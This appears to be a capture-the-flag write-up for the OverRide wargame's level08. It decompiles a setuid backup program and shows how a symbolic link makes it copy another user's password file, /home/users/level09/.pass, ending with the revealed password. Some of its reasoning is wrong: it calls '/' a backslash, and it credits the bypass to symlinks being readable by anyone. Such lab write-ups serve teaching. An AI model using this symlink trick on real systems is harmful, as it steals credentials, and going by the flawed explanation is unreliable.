## Step 1: Static & Dynamic Analysis

```c
int main(int argc, const char **argv, const char **envp)
{
  FILE *v4;
  FILE *stream;
  int fd;
  char buf;
  char dest[104];
  unsigned __int64 v9;

  v9 = __readfsqword(28);
  buf = -1;
  if ( argc != 2 )
    printf("Usage: %s filename\n", *argv);
  v4 = fopen("./backups/.log", "w");
  if ( !v4 )
  {
    printf("ERROR: Failed to open %s\n", "./backups/.log");
    exit(1);
  }
  log_wrapper(v4, "Starting back up: ", argv[1]);
  stream = fopen(argv[1], "r");
  if ( !stream )
  {
    printf("ERROR: Failed to open %s\n", argv[1]);
    exit(1);
  }
  strcpy(dest, "./backups/");
  strncat(dest, argv[1], 99 - strlen(dest));
  fd = open(dest, 193, 432LL);
  if ( fd < 0 )
  {
    printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1]);
    exit(1);
  }
  while ( 1 )
  {
    buf = fgetc(stream);
    if ( buf == -1 )
      break;
    write(fd, &buf, 1uLL);
  }
  log_wrapper(v4, "Finished back up ", argv[1]);
  fclose(stream);
  close(fd);
  return 0;
}
```

### Explanation

This binary takes a file path as a parameter and prints its content in `./backups/` + `argv[1]`.
It first checks whether the path `./backups/.log` exists. This file contains logs indicating whether `./backups/` + `argv[1]` was successfully opened and closed.
Next, the program verifies if the specified file can be opened (with the privileges of the user level09) by calling `fopen()`.
Finally, it calls `open()` to create a file in `./backups/` with our parameter name and then uses `write()` to save the file's content passsed as parameter in.

To obtain the password of the next user, we need to pass the path of the password file owned by level09 as a parameter.
The first issue is that we must pass a valid path that does not start with a backslash `/`, otherwise, when the path is created here:

```c
strcpy(dest, "./backups/");
strncat(dest, argv[1], 99 - strlen(dest));
fd = open(dest, 193, 432LL);
```

and then passed into `open()`, the resulting string will contain two `/` characters in a row, creating an invalid path causing the program to `exit()`.
The second issue is that if we pass the file containing the password for the next level as a parameter, we won’t be able to open it since we lack the necessary permissions.

To bypass these issues, we will create a symbolic link to `/home/users/level09/.pass`, because it will first provide a valid format to `open()`, as the symbolic link's name will be used instead of its full path avoiding the double backslash issue.
Secondly, ownership restrictions will be resolved since symbolic links can be read by anyone, allowing `open()` to successfully access the password file.

## Step 2: Exploiting the Binary

```bash
level08@OverRide:~$ ln -s /home/users/level09/.pass password
level08@OverRide:~$ ./level08 password
level08@OverRide:~$ cat ./backups/password
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```